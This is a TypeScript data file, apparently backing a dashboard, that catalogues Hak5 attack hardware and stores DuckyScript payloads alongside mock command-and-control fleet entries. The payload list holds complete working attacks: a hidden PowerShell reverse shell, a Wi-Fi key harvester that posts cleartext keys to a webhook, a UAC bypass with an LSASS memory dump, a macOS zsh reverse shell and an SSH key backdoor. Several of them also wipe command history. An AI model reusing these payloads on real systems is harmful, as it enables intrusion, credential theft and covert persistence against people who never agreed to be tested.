export interface Hak5DeviceProfile {
  id: string;
  name: string;
  codename: string;
  category: 'Keystroke Injection' | 'Wireless Auditing' | 'Multi-Function Implant' | 'Network Implant' | 'Hardware Keylogger' | 'Surveillance & Video' | 'Command & Control';
  primary_os: string;
  hardware_arch: string;
  attack_surfaces: string[];
  firmware_suite: string;
  payload_language: string;
  badge_color: string;
  description: string;
  official_repo_url: string;
  key_features: string[];
}

export interface DuckyPayload {
  id: string;
  title: string;
  device_compatibility: string[];
  category: 'Recon & Diagnostics' | 'Exfiltration & Storage' | 'Reverse Shells & Access' | 'Credential Harvesting' | 'WiFi Extraction' | 'Defense Evasion & Persistence' | 'Rapid Automation';
  target_os: 'Windows' | 'macOS' | 'Linux' | 'Cross-Platform' | 'Android';
  author: string;
  description: string;
  duckyscript_code: string;
}

export const HAK5_DEVICE_INVENTORY: Hak5DeviceProfile[] = [
  {
    id: 'rubber-ducky',
    name: 'USB Rubber Ducky',
    codename: 'QUACK-3.0',
    category: 'Keystroke Injection',
    primary_os: 'DuckyScript 3.0 Engine Microcontroller',
    hardware_arch: 'Arm Cortex-M3 32-bit SoC (48 MHz)',
    attack_surfaces: ['HID Keyboard Emulation', 'Keystroke Reflection (Caps/Num lock detection)', 'Rapid Hotkey Injection'],
    firmware_suite: 'Payload Studio Pro / inject.bin native runner',
    payload_language: 'DuckyScript 3.0 (Logic, Loops, Functions, Variables)',
    badge_color: 'bg-amber-500/20 text-amber-300 border-amber-600',
    description: 'The definitive keystroke injection tool disguised as a standard USB thumb drive. Types payloads at >1000 WPM, evades antivirus via human input trust, and reads host state via HID lock lights.',
    official_repo_url: 'https://github.com/hak5/usbrubberducky-payloads',
    key_features: [
      'DuckyScript 3.0 with flow control (IF, WHILE, FOR, FUNCTION)',
      'Keystroke Reflection (detects CapsLock/NumLock response for OS fingerprinting)',
      'Jitter injection timing for biometric bot detection evasion',
      'MicroSD payload storage with Mass Storage / HID dual-mode'
    ]
  },
  {
    id: 'wifi-pineapple-pager',
    name: 'WiFi Pineapple Pager',
    codename: 'PINEAPPLE-PAGER-VII',
    category: 'Wireless Auditing',
    primary_os: 'PineAP Embedded Linux (OpenWrt base)',
    hardware_arch: 'Dual-Band 2.4/5GHz Qualcomm Atheros SoC with High-Res Handheld Display',
    attack_surfaces: ['802.11a/b/g/n/ac/ax', 'Karma Attacks', 'Rogue AP Captive Portal', 'Deauthentication Matrix'],
    firmware_suite: 'PineAP Suite v2.8 (On-Device Pager UI & Web Dashboard)',
    payload_language: 'Bash / Python / PineAP API JSON',
    badge_color: 'bg-emerald-500/20 text-emerald-300 border-emerald-600',
    description: 'Handheld, self-contained wireless auditing terminal equipped with tactile directional keypad and OLED/high-res screen. Conducts Wi-Fi reconnaissance, captive portal spoofing, and deauth without requiring a laptop.',
    official_repo_url: 'https://github.com/hak5/wifipineapple-pager-payloads',
    key_features: [
      'Autonomous handheld operation with on-board display',
      'PineAP suite: Beacon Flooding, Karma AP, SSID spoofing',
      'Handshake & PMKID automated capture directly to SD storage',
      'WPA3 Transition Mode testing and client tracking telemetry'
    ]
  },
  {
    id: 'bash-bunny',
    name: 'Bash Bunny Mark II',
    codename: 'BUNNY-MK2',
    category: 'Multi-Function Implant',
    primary_os: 'Debian Linux Desktop-Grade Core',
    hardware_arch: 'Quad-Core ARM Cortex-A7 (1.3 GHz) + 512MB RAM + 8GB eMMC',
    attack_surfaces: ['USB Ethernet (RNDIS/ECM)', 'USB Mass Storage', 'HID Keystroke', 'Serial Console'],
    firmware_suite: 'Bash Bunny Multi-Payload OS v1.6',
    payload_language: 'Bash Scripting / Python 3 / DuckyScript',
    badge_color: 'bg-purple-500/20 text-purple-300 border-purple-600',
    description: 'Multi-vector USB attack platform. Emulates gigabit USB network cards, flashes fake DHCP/DNS servers, drops locked-down workstation credentials in <7 seconds, and runs full Debian utilities.',
    official_repo_url: 'https://github.com/hak5/bashbunny-payloads',
    key_features: [
      'Multi-position payload selection hardware switch',
      'ATTACKMODE switching: combine HID + STORAGE + RNDIS + ECM dynamically',
      'QuickCreds: Captures locked screen NTLM hashes over rogue USB Ethernet',
      'Full Python 3, impacket, Responder, and Metasploit integration'
    ]
  },
  {
    id: 'shark-jack',
    name: 'Shark Jack / Shark Jack OLED',
    codename: 'SHARK-OLED-ETH',
    category: 'Network Implant',
    primary_os: 'OpenWrt Linux Network OS',
    hardware_arch: 'MIPS 580 MHz SoC, 64MB RAM, Gigabit Ethernet Port',
    attack_surfaces: ['Local Subnet Ethernet Jack', 'DHCP Rogue Leases', 'Port Scanning & ARP Poisoning'],
    firmware_suite: 'Shark Jack Firmware v1.1.0 (with OLED telemetry)',
    payload_language: 'POSIX Shell / Bash / Python',
    badge_color: 'bg-cyan-500/20 text-cyan-300 border-cyan-600',
    description: 'Pocket-sized network attack tool in a physical RJ45 dongle format. Plugs directly into corporate Ethernet wall jacks to map subnets, exfiltrate credentials, and open reverse tunnels within seconds.',
    official_repo_url: 'https://github.com/hak5/sharkjack-payloads',
    key_features: [
      'Flip-switch operation: Arming mode vs Attack mode',
      'Instant Nmap reconnaissance script on Ethernet link-up',
      'RGB LED / OLED display real-time scan progress feedback',
      'Internal LiPo battery for untethered drop-and-walk scans'
    ]
  },
  {
    id: 'packet-squirrel',
    name: 'Packet Squirrel Mark II',
    codename: 'SQUIRREL-MK2',
    category: 'Network Implant',
    primary_os: 'OpenWrt Hardened Micro-Router OS',
    hardware_arch: 'Dual RJ45 Ethernet TAP, USB Host for 4G/Storage',
    attack_surfaces: ['In-Line Ethernet Man-in-the-Middle', 'Transparent Bridge', 'VPN Tunneling'],
    firmware_suite: 'Squirrel OS with Web UI & Push-Button Triggers',
    payload_language: 'Bash / tcpdump / OpenVPN scripts',
    badge_color: 'bg-blue-500/20 text-blue-300 border-blue-600',
    description: 'Stealth inline Ethernet implant designed to sit transparently between target workstations and the switch. Captures PCAP packet dumps, establishes persistent WireGuard/OpenVPN reverse tunnels, and enables covert remote access.',
    official_repo_url: 'https://github.com/hak5/packetsquirrel-payloads',
    key_features: [
      'Hardware 4-way payload selector switch',
      'Transparent hardware bypass: undetectable network latency (<0.1ms)',
      'Auto-PCAP packet capture to plugged-in USB thumb drive',
      'Remote out-of-band management via optional 4G LTE modem'
    ]
  },
  {
    id: 'lan-turtle',
    name: 'LAN Turtle Hub',
    codename: 'TURTLE-HUB',
    category: 'Network Implant',
    primary_os: 'OpenWrt Network Linux',
    hardware_arch: 'USB-to-Ethernet Adapter disguise with ARM Core',
    attack_surfaces: ['Corporate USB Port', 'Internal Network Pivot', 'DNS Spoofing'],
    firmware_suite: 'Turtle Shell Menu & Cloud C² Agent',
    payload_language: 'Bash / Python / Shell',
    badge_color: 'bg-teal-500/20 text-teal-300 border-teal-600',
    description: 'Disguised as a standard USB-to-Ethernet adapter. Provides stealth pivot access into protected internal intranets, harvests credentials, and bypasses 802.1X port security.',
    official_repo_url: 'https://github.com/hak5/lanturtle-payloads',
    key_features: [
      'Covert USB Ethernet adapter form factor',
      'Quick-setup text-based "Turtle Shell" configuration UI',
      'Meterpreter and SSH tunneling auto-daemons',
      'DNS Poisoning module (Turtle DNS Masquerade)'
    ]
  },
  {
    id: 'key-croc',
    name: 'Key Croc',
    codename: 'CROC-KEYLOG',
    category: 'Hardware Keylogger',
    primary_os: 'Embedded Linux Keylogger Engine',
    hardware_arch: 'In-Line USB-A / USB-C Intercept SoC with Onboard Wi-Fi',
    attack_surfaces: ['Hardware Keystroke Bus', 'Pattern-Triggered Exploits', 'Cloud Sync'],
    firmware_suite: 'Key Croc Framework v1.3',
    payload_language: 'Bash / Trigger Match Syntax (`MATCH "password" ...`)',
    badge_color: 'bg-red-500/20 text-red-300 border-red-600',
    description: 'Hardware keylogger with real-time pattern matching. When an operator or user types specific triggers (e.g. banking URLs or credentials), Key Croc triggers automated payloads, clones keystrokes, and beams dumps over Wi-Fi.',
    official_repo_url: 'https://github.com/hak5/keycroc-payloads',
    key_features: [
      'Passive hardware keystroke logging with 0% driver footprint',
      'Real-time keyword trigger actions (MATCH regex)',
      'Integrated Wi-Fi for covert over-the-air exfiltration',
      'Cloud C² compatibility for remote keylog streaming'
    ]
  },
  {
    id: 'screen-crab',
    name: 'Screen Crab',
    codename: 'CRAB-HDMI',
    category: 'Surveillance & Video',
    primary_os: 'Crab OS Hardware Video Capture Middleware',
    hardware_arch: 'In-Line HDMI Capture SoC (1080p 60fps) + MicroSD + Wi-Fi',
    attack_surfaces: ['HDMI In/Out Display Stream', 'Visual Shoulder Surfing', 'Remote Stream'],
    firmware_suite: 'Crab OS Video Engine',
    payload_language: 'Crab Script / Config Presets',
    badge_color: 'bg-rose-500/20 text-rose-300 border-rose-600',
    description: 'Inline HDMI video man-in-the-middle device. Connects between target PC and monitor to passively record high-resolution screenshots, full video streams, and exfiltrate over local Wi-Fi or Cloud C².',
    official_repo_url: 'https://github.com/hak5/screencrab-payloads',
    key_features: [
      'Zero-lag pass-through HDMI video (up to 4K input, 1080p capture)',
      'Scheduled snapshot capture or continuous video logging',
      'Live RTSP video streaming over local Wi-Fi network',
      'Onboard MicroSD storage up to 128GB'
    ]
  },
  {
    id: 'cloud-c2',
    name: 'Cloud C² Central Orchestrator',
    codename: 'HAK5-C2-CLOUD',
    category: 'Command & Control',
    primary_os: 'Linux x86_64 / ARM64 Golang Daemon',
    hardware_arch: 'Self-Hosted Cloud Server / VPS / Docker Container',
    attack_surfaces: ['Encrypted WebSocket (WSS)', 'REST API', 'Remote Fleet Management'],
    firmware_suite: 'Hak5 Cloud C² Enterprise v3.3.0',
    payload_language: 'Golang / Webhook integrations / Shell triggers',
    badge_color: 'bg-indigo-500/20 text-indigo-300 border-indigo-600',
    description: 'Centralized command-and-control server allowing security teams to remotely manage fleets of Hak5 devices across the world, deploy payloads over-the-air, receive exfiltrated dumps, and access interactive shell consoles.',
    official_repo_url: 'https://c2.hak5.org',
    key_features: [
      'Multi-device fleet tracking with live ping & signal telemetry',
      'Remote payload provisioning and execution triggers',
      'End-to-end encrypted TLS communications with client devices',
      'Exfiltration bucket manager with automatic parsing'
    ]
  }
];

export const DUCKY_PAYLOAD_REPOSITORY: DuckyPayload[] = [
  {
    id: 'ducky-win-revshell',
    title: 'Windows PowerShell Stealth Reverse Shell',
    device_compatibility: ['USB Rubber Ducky', 'Bash Bunny'],
    category: 'Reverse Shells & Access',
    target_os: 'Windows',
    author: 'Hak5 Community / DuckyScript 3.0',
    description: 'Bypasses Windows ExecutionPolicy using an in-memory hidden PowerShell process. Connects back to remote listener without writing binaries to the host disk.',
    duckyscript_code: `REM =======================================================
REM Windows Stealth PowerShell In-Memory Reverse Shell
REM Target: Windows 10 / 11 (Non-Admin & Admin)
REM =======================================================
DEFAULT_DELAY 100
DELAY 1500

REM Open Windows Run Dialogue
GUI r
DELAY 350
STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
ENTER
DELAY 800

REM In-Memory TCP Reverse Shell payload execution
STRING $c = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4444);
STRING $s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
STRING while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
STRING $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
STRING $r = (iex $d 2>&1 | Out-String );
STRING $x = $r + 'PS ' + (pwd).Path + '> ';
STRING $y = ([text.encoding]::ASCII).GetBytes($x);
STRING $s.Write($y,0,$y.Length);$s.Flush()};$c.Close()
ENTER
DELAY 500

REM Clean Run History Registry MRU
GUI r
DELAY 300
STRING reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f
ENTER
`
  },
  {
    id: 'ducky-wifi-stealer',
    title: 'WiFi Profile & Cleartext Key Harvester',
    device_compatibility: ['USB Rubber Ducky', 'Bash Bunny'],
    category: 'WiFi Extraction',
    target_os: 'Windows',
    author: 'Hak5 Team',
    description: 'Extracts all stored Wi-Fi SSIDs and cleartext WPA2/WPA3 pre-shared keys using netsh export, aggregates them into a single string, and POSTs to a remote webhook.',
    duckyscript_code: `REM =======================================================
REM WiFi Password Harvester & Exfiltration Dropper
REM Target: Windows 10 / 11
REM =======================================================
DEFAULT_DELAY 80
DELAY 1200

GUI r
DELAY 300
STRING powershell -w hidden -NoP -C "
STRING $w = (netsh wlan show profiles) | Select-String ':(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\s+:\\s+(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); [PSCustomObject]@{SSID=$name;Pass=$pass}};
STRING $json = $w | ConvertTo-Json -Compress;
STRING Invoke-RestMethod -Uri 'https://webhook.site/YOUR-UUID' -Method Post -Body $json -ContentType 'application/json'
STRING "
ENTER
`
  },
  {
    id: 'ducky-sysdiag-recon',
    title: 'Fast Host Reconnaissance & Hardware Audit',
    device_compatibility: ['USB Rubber Ducky'],
    category: 'Recon & Diagnostics',
    target_os: 'Windows',
    author: 'Hak5 Payload Studio',
    description: 'Rapidly collects IP configuration, ARP tables, system hardware info, logged in users, and active listening ports within 3.5 seconds.',
    duckyscript_code: `REM =======================================================
REM Rapid System Architecture & Network Reconnaissance
REM Target: Windows 10 / 11
REM =======================================================
DEFAULT_DELAY 75
DELAY 1000

GUI r
DELAY 300
STRING powershell -NoP -w min -C "
STRING $o = @{
STRING   Host = $env:COMPUTERNAME;
STRING   User = $env:USERNAME;
STRING   OS = (Get-CimInstance Win32_OperatingSystem).Caption;
STRING   RAM_GB = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2);
STRING   IPs = (Get-NetIPAddress -AddressFamily IPv4 | Where InterfaceAlias -notlike '*Loopback*').IPAddress;
STRING   OpenPorts = (Get-NetTCPConnection -State Listen).LocalPort | Select -Unique
STRING } | ConvertTo-Json;
STRING $o | Out-File -FilePath "$env:TEMP\\recon_audit.json" -Encoding utf8;
STRING Start-Process notepad.exe "$env:TEMP\\recon_audit.json"
STRING "
ENTER
`
  },
  {
    id: 'ducky-sam-lsass-dump',
    title: 'UAC Bypass & LSASS Memory Credential Dump',
    device_compatibility: ['USB Rubber Ducky', 'Bash Bunny'],
    category: 'Credential Harvesting',
    target_os: 'Windows',
    author: 'Advanced Red Team Library',
    description: 'Uses fodhelper UAC bypass to launch an elevated session, dumps the LSASS process handle to the temp directory using comsvcs.dll, and cleans up trace files.',
    duckyscript_code: `REM =======================================================
REM Elevated LSASS Memory Dump via Native comsvcs.dll
REM Requires: Admin User Context (Fodhelper UAC Auto-Bypass)
REM =======================================================
DEFAULT_DELAY 90
DELAY 1500

REM Trigger Fodhelper UAC Bypass
GUI r
DELAY 350
STRING powershell -NoP -C "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force; Set-ItemProperty 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value 'powershell -NoP -w hidden -C \\\"rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump (Get-Process lsass).Id $env:TEMP\\\\lsass.dmp full\\\"'; Set-ItemProperty 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value ''; Start-Process fodhelper.exe"
ENTER
DELAY 2500

REM Cleanup registry artifacts
GUI r
DELAY 300
STRING reg delete HKCU\\Software\\Classes\\ms-settings /f
ENTER
`
  },
  {
    id: 'ducky-macos-backdoor',
    title: 'macOS Zsh Terminal Reverse Shell & Persistence',
    device_compatibility: ['USB Rubber Ducky'],
    category: 'Reverse Shells & Access',
    target_os: 'macOS',
    author: 'Hak5 Community',
    description: 'Launches macOS Spotlight, opens Terminal, and drops a background zsh one-liner reverse TCP shell connecting to the C² endpoint.',
    duckyscript_code: `REM =======================================================
REM macOS Spotlight -> Terminal Reverse Shell
REM Target: macOS Sonoma / Sequoia
REM =======================================================
DEFAULT_DELAY 100
DELAY 1500

REM Open Spotlight Search
COMMAND SPACE
DELAY 400
STRING terminal
DELAY 300
ENTER
DELAY 1000

REM Run background reverse zsh connection
STRING zsh -c 'zmodload zsh/net/tcp && ztcp 10.0.0.50 4444 && zsh <&$REPLY >&$REPLY 2>&$REPLY &' &
ENTER
DELAY 300

REM Clear bash/zsh history
STRING history -c && exit
ENTER
`
  },
  {
    id: 'ducky-linux-ssh-key',
    title: 'Linux SSH Authorized Key Inserter',
    device_compatibility: ['USB Rubber Ducky'],
    category: 'Defense Evasion & Persistence',
    target_os: 'Linux',
    author: 'Hak5 Linux Red Team',
    description: 'Spawns terminal on Linux desktop, creates ~/.ssh/authorized_keys if missing, appends the operator public key, and sets strict 600 permissions.',
    duckyscript_code: `REM =======================================================
REM Linux Rapid SSH Public Key Drop & Persistence
REM Target: Ubuntu, Debian, Fedora, Arch Desktop
REM =======================================================
DEFAULT_DELAY 100
DELAY 1200

REM Open Terminal via standard Linux Hotkey
CONTROL ALT t
DELAY 800

REM Append public key to authorized_keys
STRING mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHak5OperatorKeyAuthorized root@c2' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
ENTER
DELAY 300

REM Clear history and exit
STRING history -c && exit
ENTER
`
  },
  {
    id: 'ducky-prank-screen-flip',
    title: 'Harmless Prank: Screen Inverter & Matrix Terminal',
    device_compatibility: ['USB Rubber Ducky'],
    category: 'Rapid Automation',
    target_os: 'Windows',
    author: 'Hak5 Fun & Testing',
    description: 'Harmless simulation script: Opens fullscreen command prompt with bright green Matrix stream.',
    duckyscript_code: `REM =======================================================
REM Harmless Simulation: Fullscreen Matrix Terminal
REM =======================================================
DEFAULT_DELAY 80
DELAY 1000

GUI r
DELAY 300
STRING cmd
ENTER
DELAY 600

REM Color green, fullscreen, tree loop
STRING color 0a
ENTER
ALT ENTER
DELAY 300
STRING echo [+] SYSTEM COMPROMISE SIMULATION INITIALIZED... & tree C:\\
ENTER
`
  }
];

export const CLOUD_C2_FLEET_PRESETS = [
  {
    id: 'c2-dev-01',
    name: 'Duck-Alpha (HQ Reception)',
    device_type: 'USB Rubber Ducky (DuckyScript 3.0)',
    ip_address: '192.168.10.45',
    status: 'ARMED',
    last_ping: '3s ago',
    active_payload: 'WiFi Credential Harvester v2.4',
    exfil_records: 14
  },
  {
    id: 'c2-dev-02',
    name: 'Pineapple-Pager-07',
    device_type: 'WiFi Pineapple Pager',
    ip_address: '10.140.2.11',
    status: 'ACTIVE_SNIFFING',
    last_ping: '1s ago',
    active_payload: 'PineAP Handshake Monitor + Rogue AP',
    exfil_records: 28
  },
  {
    id: 'c2-dev-03',
    name: 'Bunny-Field-Probe',
    device_type: 'Bash Bunny Mk II',
    ip_address: '172.16.88.90',
    status: 'EXFILTRATING',
    last_ping: '6s ago',
    active_payload: 'QuickCreds NTLM Hash Dump',
    exfil_records: 4
  },
  {
    id: 'c2-dev-04',
    name: 'Shark-Jack-Ethernet-04',
    device_type: 'Shark Jack OLED',
    ip_address: '192.168.1.182',
    status: 'STANDBY',
    last_ping: '12s ago',
    active_payload: 'Subnet nmap vulnerability mapper',
    exfil_records: 62
  },
  {
    id: 'c2-dev-05',
    name: 'Squirrel-Inline-Tap',
    device_type: 'Packet Squirrel Mk II',
    ip_address: '10.0.4.22',
    status: 'TUNNEL_OPEN',
    last_ping: '2s ago',
    active_payload: 'WireGuard Persistent Tunnel + TCPDump',
    exfil_records: 110
  }
];
